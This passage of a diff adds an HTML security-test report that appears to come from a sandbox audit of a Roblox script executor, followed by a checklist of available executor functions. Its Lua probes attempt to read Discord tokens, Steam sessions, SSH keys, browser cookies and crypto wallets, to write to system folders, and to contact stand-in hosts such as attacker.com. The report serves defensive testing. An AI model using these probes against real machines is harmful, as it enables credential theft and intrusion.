+        if not readfile or not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("APPDATA").."\\discord\\Local Storage\\leveldb")
+            listfiles(os.getenv("APPDATA").."\\discordcanary\\Local Storage\\leveldb")
+        end)
+        assert(err, "Discord token access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Steam Session Hijacking</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p79',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p79'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Steam Session Hijacking",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf")
+        end)
+        assert(err, "Steam session data accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>SSH Key Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p82',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p82'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "SSH Key Theft",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("USERPROFILE").."\\.ssh\\id_rsa")
+        end)
+        assert(err, "SSH private key accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Browser Cookie Extraction</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p83',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p83'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Browser Cookie Extraction",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile(os.getenv("LOCALAPPDATA").."\\Google\\Chrome\\User Data\\Default\\Cookies")
+            readfile(os.getenv("LOCALAPPDATA").."\\Microsoft\\Edge\\User Data\\Default\\Cookies")
+            readfile(os.getenv("LOCALAPPDATA").."\\Mozilla\\Firefox\\Profiles")
+        end)
+        assert(err, "Browser cookies accessible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Cryptocurrency Wallet Theft</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p84',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p84'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Cryptocurrency Wallet Theft",
+    callback = function()
+        if not readfile or not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("APPDATA").."\\Ethereum\\keystore")
+            listfiles(os.getenv("APPDATA").."\\Bitcoin\\wallet.dat")
+        end)
+        assert(err, "Crypto wallet access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Module Script Injection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p85',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p85'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Module Script Injection",
+    callback = function()
+        local _, err = pcall(function()
+            if loadstring then
+                local m = loadstring("return setfenv(function() end, getfenv(0))()")
+                if m then error("Module injection possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>CoreGui Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p86',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p86'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "CoreGui Access",
+    callback = function()
+        local _, err = pcall(function()
+            local rg = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+            if rg then error("CoreGui manipulation possible") end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Plugin Security Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p87',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p87'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Plugin Security Bypass",
+    callback = function()
+        local _, err = pcall(function()
+            if plugin then error("Plugin context accessible") end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Require Hijacking</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p88',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p88'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Require Hijacking",
+    callback = function()
+        local _, err = pcall(function()
+            if hookfunction then
+                hookfunction(require, function()
+                    return function() error("Require hijacked") end
+                end)
+                error("Require function hookable")
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Metatable Protection Bypass</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p89',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p89'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Metatable Protection Bypass",
+    callback = function()
+        local _, err = pcall(function()
+            local protected = setmetatable({}, {__metatable = "Protected"})
+            if getrawmetatable then
+                local mt = getrawmetatable(protected)
+                if mt then error("Metatable protection bypassed") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Memory Dump Capability</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p93',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p93'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Memory Dump Capability",
+    callback = function()
+        local _, err = pcall(function()
+            if readfile and writefile then
+                local gc = getgc and getgc(true) or {}
+                if #gc &gt; 10000 then error("Memory enumeration possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Stack Trace Manipulation</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p97',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p97'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Stack Trace Manipulation",
+    callback = function()
+        local _, err = pcall(function()
+            if debug and debug.traceback then
+                local _ = debug.traceback()
+                if setstack then error("Stack manipulation possible") end
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Heap Spray Detection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p98',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p98'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Heap Spray Detection",
+    callback = function()
+        local _, err = pcall(function()
+            local spray = {}
+            for i = 1, 100000 do spray[i] = string.rep("A", 1000) end
+            if #spray &gt; 50000 then return "WARNING: Unrestricted memory allocation" end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Temp Folder Write Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p99',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p99'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Temp Folder Write Access",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile(os.getenv("TEMP").."\\malware.exe","test")
+        end)
+        assert(err, "Unrestricted temp folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>AppData Roaming Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p100',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p100'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "AppData Roaming Access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function() listfiles(os.getenv("APPDATA")) end)
+        assert(err, "AppData enumeration")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Desktop File Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p101',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p101'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Desktop File Access",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Desktop")
+        end)
+        assert(err, "Desktop folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Downloads Folder Enumeration</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p102',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p102'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Downloads Folder Enumeration",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Downloads")
+        end)
+        assert(err, "Downloads folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Documents Folder Access</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p103',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p103'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Documents Folder Access",
+    callback = function()
+        if not listfiles then return "Executor does not support function" end
+        local _, err = pcall(function()
+            listfiles(os.getenv("USERPROFILE").."\\Documents")
+        end)
+        assert(err, "Documents folder access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File Extension Spoofing</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p104',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p104'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File Extension Spoofing",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function() writefile("innocent.txt.exe","malware") end)
+        assert(err, "Executable extension allowed")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Path Traversal (Relative)</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p106',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p106'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "Path Traversal (Relative)",
+    callback = function()
+        if not readfile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            readfile("../../../Windows/System32/drivers/etc/hosts")
+        end)
+        assert(err, "Relative path traversal")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>File Overwrite Protection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p108',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p108'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "File Overwrite Protection",
+    callback = function()
+        if not writefile then return "Executor does not support function" end
+        local _, err = pcall(function()
+            writefile("C:\\Windows\\System32\\important.dll","overwritten")
+        end)
+        assert(err, "System file overwrite possible")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>WebSocket Connection</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p111',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p111'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "WebSocket Connection",
+    callback = function()
+        local _, err = pcall(function()
+            if WebSocket then
+                WebSocket.connect("ws://attacker.com")
+                error("WebSocket available")
+            end
+        end)
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>FTP Connection Attempt</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>nil</td><td><button class='vbtn vbtn-pass' onclick="toggle('p112',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p112'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: nil
+
+-- Probe source that was blocked:
+{
+    name = "FTP Connection Attempt",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local _, err = pcall(function()
+            request({Url="ftp://malicious-ftp.com",Method="GET"})
+        end)
+        assert(err, "FTP protocol access")
+    end,
+},</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>IP Geolocation Leak</td><td><span class='tag tag-pass'>MITIGATED</span></td><td class='td-msg'>WARNING: IP geolocation accessible</td><td><button class='vbtn vbtn-pass' onclick="toggle('p113',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p113'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Test passed (mitigated)
+-- Runtime message: WARNING: IP geolocation accessible
+
+-- Probe source that was blocked:
+{
+    name = "IP Geolocation Leak",
+    callback = function()
+        if not request then return "Executor does not support function" end
+        local ok, result = pcall(function()
+            local resp = request({Url="https://ipapi.co/json/"})
+            if resp and resp.Body then
+                return game:GetService("HttpService"):JSONDecode(resp.Body)
+            end
+        end)
+        if ok and result then return "WARNING: IP geolocation accessible" end
+    end,
+},</pre></td></tr>      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="sec" id="functions">
+  <div class="sh">
+    <div class="sh-title">FUNCTIONS</div>
+    <div class="sh-meta">55 CHECKED · 55 PRESENT · 0 MISSING</div>
+  </div>
+  <div class="stat-grid" style="margin-bottom:24px">
+    <div class='stat-card stat-pass'><div class='stat-val'>55</div><div class='stat-label'>PRESENT</div><div class='stat-bar'></div></div>    <div class='stat-card stat-fail'><div class='stat-val'>0</div><div class='stat-label'>MISSING</div><div class='stat-bar'></div></div>    <div class='stat-card stat-pass'><div class='stat-val'>100%</div><div class='stat-label'>COVERAGE</div><div class='stat-sub'>55 checked</div><div class='stat-bar'></div></div>  </div>
+  <div class='tbl-wrap'><table><thead><tr><th class='th-accent'></th><th>FUNCTION</th><th>CATEGORY</th><th>STATUS</th><th></th></tr></thead><tbody><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>Drawing</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p114',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p114'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: Drawing
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if Drawing then
+    print("Drawing is available")
+else
+    print("Drawing is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>appendfile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p115',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p115'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: appendfile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if appendfile then
+    print("appendfile is available")
+else
+    print("appendfile is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>checkcaller</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p116',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p116'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: checkcaller
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if checkcaller then
+    print("checkcaller is available")
+else
+    print("checkcaller is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.base64decode</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p117',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p117'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.base64decode
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.base64decode then
+    print("crypt.base64decode is available")
+else
+    print("crypt.base64decode is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.base64encode</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p118',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p118'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.base64encode
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.base64encode then
+    print("crypt.base64encode is available")
+else
+    print("crypt.base64encode is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.decrypt</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p119',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p119'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.decrypt
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.decrypt then
+    print("crypt.decrypt is available")
+else
+    print("crypt.decrypt is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.encrypt</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p120',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p120'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.encrypt
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.encrypt then
+    print("crypt.encrypt is available")
+else
+    print("crypt.encrypt is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.generatebytes</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p121',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p121'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.generatebytes
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.generatebytes then
+    print("crypt.generatebytes is available")
+else
+    print("crypt.generatebytes is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.generatekey</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p122',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p122'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.generatekey
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.generatekey then
+    print("crypt.generatekey is available")
+else
+    print("crypt.generatekey is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>crypt.hash</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p123',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p123'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: crypt.hash
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if crypt.hash then
+    print("crypt.hash is available")
+else
+    print("crypt.hash is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>decompile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p124',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p124'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: decompile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if decompile then
+    print("decompile is available")
+else
+    print("decompile is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>delfile</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p125',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p125'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: delfile
+-- Category: MISC FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if delfile then
+    print("delfile is available")
+else
+    print("delfile is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>dumpstring</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p126',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p126'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: dumpstring
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if dumpstring then
+    print("dumpstring is available")
+else
+    print("dumpstring is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getcallingscript</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p127',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p127'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getcallingscript
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getcallingscript then
+    print("getcallingscript is available")
+else
+    print("getcallingscript is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getconnections</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p128',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p128'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getconnections
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getconnections then
+    print("getconnections is available")
+else
+    print("getconnections is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getconstant</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p129',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p129'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getconstant
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getconstant then
+    print("getconstant is available")
+else
+    print("getconstant is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getconstants</td><td class='td-cat'>DEBUG FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p130',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p130'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getconstants
+-- Category: DEBUG FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getconstants then
+    print("getconstants is available")
+else
+    print("getconstants is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getfenv</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p131',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p131'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getfenv
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getfenv then
+    print("getfenv is available")
+else
+    print("getfenv is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getgc</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p132',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p132'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getgc
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getgc then
+    print("getgc is available")
+else
+    print("getgc is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>getgenv</td><td class='td-cat'>EXECUTOR FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p133',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p133'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: getgenv
+-- Category: EXECUTOR FUNCTIONS
+-- Status:   PRESENT (loaded by executor)
+
+-- Check:
+if getgenv then
+    print("getgenv is available")
+else
+    print("getgenv is NOT available")
+end</pre></td></tr><tr class='row row-pass'><td class='td-accent accent-pass'></td><td class='td-name'>gethiddenproperty</td><td class='td-cat'>MISC FUNCTIONS</td><td><span class='tag tag-pass'>PRESENT</span></td><td><button class='vbtn vbtn-pass' onclick="toggle('p134',this)">VIEW DETAIL</button></td></tr><tr class='det-row' id='p134'><td colspan='5' class='det-cell accent-pass'><pre class='det-pre'>-- Function: gethiddenproperty
+-- Category: MISC FUNCTIONS
